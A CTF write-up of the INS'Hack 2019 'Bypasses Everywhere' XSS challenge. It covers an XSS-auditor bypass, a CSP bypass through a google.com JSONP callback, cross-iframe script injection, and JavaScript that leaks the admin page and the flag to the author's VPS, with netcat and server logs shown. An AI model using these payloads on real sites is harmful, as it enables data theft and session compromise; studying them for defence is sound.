---
layout: post
title: Bypasses Everywhere
category: INS-Hack-2019
---

# Description

I'm selling very valuable stuff for a reasonable amount of money (for me at least). Go check it out!

https://bypasses-everywhere.ctf.insecurity-insa.fr

---

**Ins'hack released this XSS challenge, as well as a version 2.0 after a team found an
unintended solution. This writeup will cover OpenToAll's solution for both these challenges.**

# The Challenge

This challenge consisted of a website with 2 features :
- Viewing articles (located at /article)
- Sending an article to the admin (located at /admin)

## Article Viewing Page

![article_page](/assets/img/inshack-2019/article_page.png)

The article viewing page is pretty straightforward. The page is generated from 5 GET parameters
(name, time, unit, img, description).

Visiting `/article?name=my_name&time=my_time&unit=my_unit&img=my_img&description=my_desc` will
generate the following HTML :

```html
<!DOCTYPE html>
<html>
<head>
  <title>Welcome!</title>
</head>
<body>

<h1>my_name</h1>
<img style="max-width:80vh" src="my_img">
<p>
  my_desc
  <br>
  Price:
  <code style="color: red">
    1801€
  </code>
  <br>
  <b>Posted</b> <code>my_timemy_unit</code> ago
</p>

  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</body>
</html>
```

## Admin Page

![admin_page](/assets/img/inshack-2019/admin_page.png)

On the `/admin` page, we have a form from which we can send a URL. This URL will
be visited by an "admin". From this feature alone, we can determine that we're dealing with
an XSS challenge.

There is also a note in the bottom of the page suggesting that we should try
to access this page from `127.0.0.1:8080` rather than from the external host
(`bypasses-everywhere.ctf.insecurity-insa.fr`) :

```
You're currently seeing this page from an unknown IP address.
I'm usually connecting to this page by clicking a link from another hidden page on http://127.0.0.1:8080, so I'm pretty sure this page is safe :)
```

This gives us an idea of what we have to do : Find an XSS on the website, send it to the admin,
and make the admin leak the contents of `http://127.0.0.1:8080/admin` to us.

## Admin's browser

Before moving forward, we must check what browser the admin is using. This is important, since
different browsers have different behaviors, as well as potential XSS auditors.

I believe most XSS challenges these days use Puppeteer, which is a Node library for the Google
Chrome headless browser. It's very likely that our admin will be using Chrome.

We can confirm this by filling the admin page's form with a host we control and setting up
a netcat listener :

```bash
corb3nik@my_vps ~
$ nc -lvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from ip-51-83-110.eu 33450 received!
GET / HTTP/1.1
Host: my_vps:1337
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/73.0.3683.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
```

As we can see from the `User-Agent` header, the admin is using headless Google Chrome.

# Finding an XSS Vulnerability

There are a total of two XSS vulnerabilities in this webapp, one on `/article` and another on
`/admin`. For this solution, we won't be looking at the `/admin` page at all.

Going through the available parameters on the `/article` page, we find that two of them are
vulnerable to reflected XSS : `time` and `unit`. Sending `<script>alert(1)</script>` in both
of these parameters clearly demonstrates this :

```bash
$ curl 'https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=%3Cscript%3Ealert(1)%3C/script%3E&unit=%3Cscript%3Ealert(1)%3C/script%3E'
<!DOCTYPE html>
<html>
<head>
        <title>Welcome!</title>
</head>
<body>


<h1>#</h1>
<img style="max-width:80vh" src="#">
<p>
        #
        <br>
        Price:
        <code style="color: red">
                3476€
        </code>
        <br>
        <b>Posted</b> <code><script>alert(1)</script><script>alert(1)</script></code> ago
</p>


        <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</body>
</html>
```

# Bypassing Chrome's XSS auditor

Chrome is pretty good at detecting reflected XSS payloads. In fact, the payload
above will not work in Chrome :

![chrome_block](/assets/img/inshack-2019/chrome_block.png)

The red blocks above represent snippets of code that are blocked by the XSS auditor.
Chrome recognized that these are the result of an XSS attack and tries to block the payloads
accordingly.

The way this is detected is pretty straightforward : Chrome looks for "malicious" sequences of
characters that are found in both the webpage and in the URL. For example, if the URL contains
`?x=<img src=x onload=alert(1)>` and the webpage contains `<img src=x onload=alert(1)>`, then
Chrome will block the snippet.

This means that if we want to get a working XSS for this challenge (bypassing the XSS auditor),
we need to create a payload in such a way that the URL will be different than what's reflected
in the webpage.

Luckily, since we have two vulnerable parameters, we can bypass the auditor easily : `https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script>ale&unit=rt(1)</script>`

![auditor_bypass](/assets/img/inshack-2019/auditor_bypass.png)

# Bypassing CSP

As mentioned earlier, our goal is to send an XSS payload to the admin in order to make him
leak the contents of `http://127.0.0.1:8080/admin` to us.

With the XSS auditor out of the way, we should technically be able to do this with a
payload like the following :

```html
<script>
var req = new XMLHttpRequest();

// Send a request to /admin
req.open('GET', 'http://127.0.0.1:8080/admin');

// Fetch the contents of /admin and send it to http://my_vps:1337/leak.txt?[admin_page_content]
req.onreadystatechange = function() {
  document.write('<img src=http://my_vps:1337/leak.txt?' + btoa(this.responseText) + '>');
};

req.send();
</script>
```

Unfortunately, this won't work since the /article page is blocked by CSP :

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 513
Content-Security-Policy: script-src www.google.com; img-src *; default-src 'none'; style-src 'unsafe-inline'
```

Based on the `Content-Security-Policy` header above, we can only use `script` tags if
their `src` attribute comes from the `www.google.com` domain (`script-src www.google.com`).

Also, with the missing `connect-src` directive, `XMLHttpRequest` calls [are disallowed by default](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src).

Therefore, we need to bypass both of these restrictions if we want to leak the `/admin` page.

## www.google.com and JSONP

[vakzz](https://twitter.com/wcbowling), one of our teammates, found a JSONP endpoint on
google.com allowing us to generate valid JS through the `callback` parameter :

```bash
$ curl 'https://www.google.com/complete/search?client=chrome&q=hello&callback=my_function'
my_function && my_function(["hello",["hello fresh","hello magazine","hello neighbor","hello kitty","hello google","hello canada","hello in spanish","hello in french","hello lyrics","hello world","hello in japanese","hello fresh menu","hello fresh reviews","hellosign","hello in italian","hello in korean","hello fresh.ca","hello in german","hello in russian","hello there"],["","","","","","","","","","","","","","","","","","","",""],[],{"google:clientdata":{"bpc":false,"tlw":false},"google:suggestrelevance":[601,600,567,566,565,564,563,562,561,560,559,558,557,556,555,554,553,552,551,550],"google:suggesttype":["QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY"],"google:verbatimrelevance":1300}])
```

Essentially, this endpoint will generate a valid function call to the `callback` function
of our choice using the contents specified by the `q` parameter as arguments.

There are a few restrictions though : the `callback` parameter can only contain letters, numbers
and dots (`.`). Therefore we can only do one function call.

With this limited control, we are able to get a valid XSS PoC ( an `alert()` call) on the
`/article` page, bypassing CSP : `https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=%3Cscript/src=&unit=https://www.google.com/complete/search?client=chrome%26q=hello%26callback=alert%3E%3C/script%3E`

![alert_poc](/assets/img/inshack-2019/alert_poc.png)

The screenshot above is the result of this XSS payload :
```html
<script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>
```

When loaded, the `alert()` function is called with the `"hello"` string as a parameter (among other things).

# Leaking the /admin page

At this point, we are able to perform a single function call with limited control on the
function's arguments. Also, we've bypassed the `script-src` CSP directive, but we still
can't do `XMLHttpRequest` calls...

In order to bypass this restriction, I've decided to focus on finding a way to gain
XSS on the `/admin` page via the XSS on the `/article` page. The `/admin` page doesn't
have any CSP rules, therefore an XSS on `/admin` would allow us to leak its contents easily.

> Note : I mentioned earlier that there was already an XSS on /admin. Unfortunately, that XSS
is blocked by the XSS auditor, and we couldn't find any bypasses for it.

## Introducing iframes

One thing we've noticed during the CTF was that the entire website was frameable. This means we
can host a webpage and include the contents of the `/admin` and `/article` page like so :

```html
<iframe name="article" src="https://bypasses-everywhere.ctf.insecurity-insa.fr/article"></iframe>
<iframe name="admin" src="https://bypasses-everywhere.ctf.insecurity-insa.fr/admin"></iframe>
```

---

A cool thing that we can do with iframes, is to access a parent's iframes via JavaScript code
located in a child iframe.

For example, given a page with the following contents :

```html
<iframe name="frame1" src="https://domain_x/page1"></iframe>
<iframe name="frame2"src="https://some_random_domain"></iframe>
<iframe name="frame3" src="https://domain_x/page2"></iframe>
```

The first iframe called `frame1` can overwrite the HTML of `frame3` with this JS code :

```javascript
// JavaScript code hosted in https://domain_x/page1
top.frame3.document.write("new content")
```

This is possible because the `src` attributes of `frame1` and `frame3` share the same origin
(`domain_x`). In the same manner, JS code hosted on `frame2` can't modify the HTML of `frame1`
and `frame3` because its origin (`https://some_random_domain`) is different.

## Bypassing CSP : Obtaining XSS on /admin

Using the behavior mentioned above, we can obtain XSS on `/admin` like so :

1. Host a page with 2 iframes : one pointing to `/admin` and another pointing to `/article`

2. Trigger the XSS on `/article` using the `top.admin_frame.setTimeout` callback parameter, which
in turn will eval the contents of the `q` parameter in the context of the `/admin` page.

3. Overwrite the HTML of the `/admin` page with  `<script src="http://my_vps/payload.js"></script>`

This will give us JS execution on the `/admin` page, without being blocked by CSP.

Since we want to leak the contents of 127.0.0.1:8080, we'll have to replace every instance
of `https://bypasses-everywhere.ctf.insecurity-insa.fr/` in our payload with `http://127.0.0.1:8080` when sending it to the bot.

Here is the final payload (`my_vps` is my own box hosted somewhere online) :

```html
<!-- Code hosted on http://my_vps:1337/ -->

<!-- /article frame containing our initial XSS payload / CSP bypass -->
<iframe src="http://127.0.0.1:8080/article?time=<script/src='&unit=https://www.google.com/complete/search?client=chrome%26q=document.write(%2522<script+src=//my_vps:1337/payload.js></script>%2522)//%26callback%3Dtop.target.setTimeout'></script>"></iframe>

<!-- Target iframe pointing to /admin -- The HTML in this frame will be overwritten -->
<iframe name="target" src="http://127.0.0.1:8080/admin"></iframe>
```

With the payload above, by making the bot visit `http://my_vps:1337/`,
any code hosted on `http://my_vps/payload.js` will be executed.

![xss_admin](/assets/img/inshack-2019/xss_admin.png)

Finally we can host our original payload in payload.js order to leak `/admin` :

```js
var req = new XMLHttpRequest();

// Send a request to /admin
req.open('GET', 'http://127.0.0.1:8080/admin');

// Fetch the contents of /admin and send it to http://my_vps/leak.txt?[admin_page_content]
req.onreadystatechange = function() {
  document.write('<img src=http://my_vps:1337/leak.txt?' + btoa(this.responseText) + '>');
};

req.send();
```

Obtaining the leak :

```bash
$ php -S 0:1337
PHP 7.2.17-0ubuntu0.18.10.1 Development Server started at Sun May  5 21:12:25 2019
Listening on http://0:1337
Document root is /home/corb3nik/insa
Press Ctrl-C to quit.
[Sun May  5 21:13:02 2019] 51.83.110.222:36412 [200]: /
[Sun May  5 21:13:02 2019] 51.83.110.222:36426 [200]: /payload.js
[Sun May  5 21:13:02 2019] 51.83.110.222:36432 [404]: /leak.txt? - No such file or directory
[Sun May  5 21:13:02 2019] 51.83.110.222:36434 [404]: /leak.txt?PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTx0aXRsZT5XZWxjb21lITwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgoJCgo8aDE+U2VuZCBtZSBhIGdpZnQ8L2gxPgo8cD4KCUknbSBjdXJyZW50bHkgbG9va2luZyB0byBzZWxsIG1vcmUgY29zdGx5IHN0dWZmLiBJZiB5b3Ugd2FudCB0byBoZWxwIG1lLCBwbGVhc2Ugc2VuZCBtZSBhIGxpbmsgdG8gdGhlIGFydGljbGUgeW91IHdhbnQgdG8gZ2l2ZSBtZSAoZm9yIGZyZWUhKSBhbmQgSSdsbCBjaGVjayBpdCBvdXQuCjwvcD4KPGZvcm0gYWN0aW9uPSIvdXJsIiBtZXRob2Q9InBvc3QiPgoJPGxhYmVsPlVybDwvbGFiZWw+Cgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXJsIiBwbGFjZWhvbGRlcj0iaHR0cHM6Ly9ieXBhc3Nlcy1ldmVyeXdoZXJlLmN0Zi5pbnNlY3VyaXR5LWluc2EuZnIvYXJ0aWNsZT9uYW1lPVBsYW5lIj4KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgo8L2Zvcm0+Cjxicj4KCjxpbWcgc3R5bGU9J21heC13aWR0aDogNTB2aCcgc3JjPSJOb25lIj4KCmZyb20gZmxhc2sgaW1wb3J0IHJlcXVlc3QsIHJlbmRlcl90ZW1wbGF0ZQpmcm9tIGZsYXNrX2NzcC5jc3AgaW1wb3J0IGNzcF9oZWFkZXIKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByZQoKd2l0aCBvcGVuKCJmbGFnLnR4dCIpIGFzIGY6CiAgICBGTEFHID0gZi5yZWFkKCkKCmRlZiBfbG9jYWxfYWNjZXNzKCkgLT4gYm9vbDoKICAgIGlmIHJlcXVlc3QucmVmZXJyZXIgaXMgbm90IE5vbmUgYW5kIG5vdCByZS5tYXRjaChyIl5odHRwOi8vMTI3XC4wXC4wXC4xKDpcZCspPy8iLCByZXF1ZXN0LnJlZmVycmVyKToKICAgICAgICByZXR1cm4gRmFsc2UKICAgIHJldHVybiByZXF1ZXN0LnJlbW90ZV9hZGRyID09ICIxMjcuMC4wLjEiCgpkZWYgcm91dGVzKGFwcCwgY3NwKToKICAgIEBjc3BfaGVhZGVyKGNzcCkKICAgIEBhcHAucm91dGUoIi9hZG1pbiIpCiAgICBkZWYgYWRtKCk6CiAgICAgICAgdXJsID0gcmVxdWVzdC5hcmdzLmdldCgicGljdHVyZSIpCiAgICAgICAgaWYgX2xvY2FsX2FjY2VzcygpOgogICAgICAgICAgICB3aXRoIG9wZW4oX19maWxlX18pIGFzIGY6CiAgICAgICAgICAgICAgICBjb2RlID0gZi5yZWFkKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBjb2RlID0gTm9uZQogICAgICAgIHJldHVybiByZW5kZXJfdGVtcGxhdGUoImFkbWluLmh0bWwiLCB1cmw9dXJsLCBjb2RlPWNvZGUpCgogICAgQGNzcF9oZWFkZXIoY3NwKQogICAgQGFwcC5yb3V0ZSgiL2FydGljbGUiLCBtZXRob2RzID0gWyJQT1NUIl0pCiAgICBkZWYgc2VjcmV0KCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBhc3NlcnQgX2xvY2FsX2FjY2VzcygpCiAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0LmdldF9qc29uKGZvcmNlPVRydWUpCiAgICAgICAgICAgIGFzc2VydCBkYXRhWyJzZWNyZXQiXSA9PSAiTm8gb25lIHdpbGwgbmV2ZXIgZXZlciBhY2Nlc3MgdGhpcyBiZWF1dHkiCiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZGF0YVsidXJsIl0sIGRhdGE9ewogICAgICAgICAgICAgICAgImZsZyI6IEZMQUcsCiAgICAgICAgICAgIH0sIHRpbWVvdXQ9MikKICAgICAgICAgICAgcmV0dXJuICJ5ZWFoISIKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGFwcC5sb2dnZXIuZXJyb3IoZSkKICAgICAgICAgICAgcmV0dXJuICdXdXQ/JwoKCgoJPHNjcmlwdCBzcmM9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vcmVjYXB0Y2hhL2FwaS5qcyIgYXN5bmMgZGVmZXI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg== - No such file or directory
```

# Getting the flag

Using the previous XSS, we were able to leak the contents of `http://127.0.0.1:8080/admin`.
Here's what the page looks like :

```
<!DOCTYPE html>
<html>
<head>
	<title>Welcome!</title>
</head>
<body>



<h1>Send me a gift</h1>
<p>
	I'm currently looking to sell more costly stuff. If you want to help me, please send me a link to the article you want to give me (for free!) and I'll check it out.
</p>
<form action="/url" method="post">
	<label>Url</label>
	<input type="text" name="url" placeholder="https://bypasses-everywhere.ctf.insecurity-insa.fr/article?name=Plane">
	<input type="submit" value="Submit">
</form>
<br>

<img style='max-width: 50vh' src="None">

from flask import request, render_template
from flask_csp.csp import csp_header
import requests
import re

with open("flag.txt") as f:
    FLAG = f.read()

def _local_access() -> bool:
    if request.referrer is not None and not re.match(r"^http://127\.0\.0\.1(:\d+)?/", request.referrer):
        return False
    return request.remote_addr == "127.0.0.1"

def routes(app, csp):
    @csp_header(csp)
    @app.route("/admin")
    def adm():
        url = request.args.get("picture")
        if _local_access():
            with open(__file__) as f:
                code = f.read()
        else:
            code = None
        return render_template("admin.html", url=url, code=code)

    @csp_header(csp)
    @app.route("/article", methods = ["POST"])
    def secret():
        try:
            assert _local_access()
            data = request.get_json(force=True)
            assert data["secret"] == "No one will never ever access this beauty"
            requests.post(data["url"], data={
                "flg": FLAG,
            }, timeout=2)
            return "yeah!"
        except Exception as e:
            app.logger.error(e)
            return 'Wut?'



	<script src="https://www.google.com/recaptcha/api.js" async defer></script>
</body>
</html>
```

The leaked `/admin` page reveals the source code used on the server.

By looking at the `/article` route, if we send a `POST` request containing the JSON payload `{"secret" : "No one will never ever access this beauty", "url" : "http://my_vps"}`, the server will
send the flag back to us.

We can simply update payload.js with the following to obtain the flag :

```js
 var req = new XMLHttpRequest();
 req.open('POST', 'http://127.0.0.1:8080/article');
 req.setRequestHeader("Content-Type", "application/json");
 req.send(JSON.stringify({
   "secret": "No one will never ever access this beauty",
   "url": "http://my_vps:1338/"
 }));
```

Getting the flag :

```bash
$ nc -lvp 1338
Listening on [0.0.0.0] (family 0, port 1338)
Connection from ip-51-83-110.eu 48498 received!
POST / HTTP/1.1
Host: my_vps:1338
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 81
Content-Type: application/x-www-form-urlencoded

flg=INSA%7Bf330a6678b14df79b05f63040537b384e4c87c87525de8d396b43250988bdfaa%7D%0A
```

Flag : INSA{f330a6678b14df79b05f63040537b384e4c87c87525de8d396b43250988bdfaa}
